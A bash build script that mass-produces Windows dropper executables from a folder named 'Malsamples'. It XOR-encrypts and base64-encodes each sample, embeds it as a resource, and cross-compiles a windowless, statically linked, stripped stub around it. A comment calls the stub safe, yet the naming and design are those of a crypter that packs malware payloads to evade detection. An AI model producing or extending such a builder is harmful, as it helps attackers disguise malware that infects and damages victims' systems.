#!/usr/bin/env bash
set -euo pipefail

# Configuration - edit if necessary
SRC_DIR="$HOME/Documents/MalGen/DropperGen/Malsamples"
BLOBS_DIR="$SRC_DIR/encrypted_blobs"
OUT_DIR="$SRC_DIR/EncryptedSamples"
XOR_SCRIPT="./xor_encrypt.py"   # path to your xor_encrypt.py
STUB_CPP="./dropper.cpp"  # safe stub (must not execute payloads)
WINDRES="/usr/bin/x86_64-w64-mingw32-windres"
CXX="/usr/bin/x86_64-w64-mingw32-g++"
RC_TEMPLATE="IDR_EXE1 RCDATA \"__BLOB_PATH__\"\n"

# Create output directories
mkdir -p "$BLOBS_DIR"
mkdir -p "$OUT_DIR"

# Check dependencies
command -v "$WINDRES" >/dev/null 2>&1 || { echo "windres not found at $WINDRES"; exit 1; }
command -v "$CXX" >/dev/null 2>&1 || { echo "g++ cross-compiler not found at $CXX"; exit 1; }
python3 -c "import sys" >/dev/null 2>&1 || { echo "python3 not found"; exit 1; }
if [ ! -f "$XOR_SCRIPT" ]; then
  echo "xor_encrypt.py not found at $XOR_SCRIPT"
  exit 1
fi
if [ ! -f "$STUB_CPP" ]; then
  echo "Safe stub file not found at $STUB_CPP"
  exit 1
fi

# Process each .exe in source folder
counter=0
manifest="$OUT_DIR/build_manifest.csv"
echo "index,original_filename,stub_filename,blob_path" > "$manifest"

# collect files (accept names without .exe)
mapfile -t exes < <(find "$SRC_DIR" -maxdepth 1 -type f \
  ! -name '*.blob' \
  ! -name '*.res' \
  ! -name 'build_manifest.csv' \
  ! -name "$(basename "$XOR_SCRIPT")" \
  ! -name "$(basename "$STUB_CPP")" \
  -print  | sort -V)

if [ ${#exes[@]} -eq 0 ]; then
  echo "No input files found in $SRC_DIR"
  exit 0
fi

for exe in "${exes[@]}"; do
  counter=$((counter + 1))
  base=$(basename "$exe")                      # e.g., "1" or "foo.exe"
  name_noext="${base%.*}"                      # keeps "1" or "foo" either way
  blob_path="$BLOBS_DIR/${name_noext}.blob"
  stub_name="${name_noext}.exe"                  # numbered stub output
  out_exe="$OUT_DIR/$stub_name"

  echo "[$counter] Processing: $base -> $stub_name"

  python3 "$XOR_SCRIPT" "$exe" "$blob_path"
  tmp=$(mktemp)
  base64 --wrap=0 "$blob_path" > "$tmp"
  mv "$tmp" "$blob_path"

  tmp_rc="$(mktemp --suffix=.rc)"
  printf '101 RCDATA "%s"\n' "$blob_path" > "$tmp_rc"
  tmp_res="$(mktemp --suffix=.res)"
  "$WINDRES" -i "$tmp_rc" -O coff -o "$tmp_res"
  "$CXX" -O2 -Wall -DORIG_NAME="\"$base\"" "$STUB_CPP" "$tmp_res" -o "$out_exe" -static -static-libgcc -static-libstdc++ -lgdiplus -luser32 -lgdi32 -lole32 -luuid -lcrypt32 -mwindows -municode -s

  rm -f "$tmp_rc" "$tmp_res"
  echo "${counter},\"${base}\",\"${stub_name}\",\"${blob_path}\"" >> "$manifest"
done

echo "Built $counter stubs in $OUT_DIR"
echo "Manifest: $manifest"
if [ -d "$BLOBS_DIR" ]; then
  echo "Cleaning up blobs folder: $BLOBS_DIR"
  rm -rf "$BLOBS_DIR"
fi
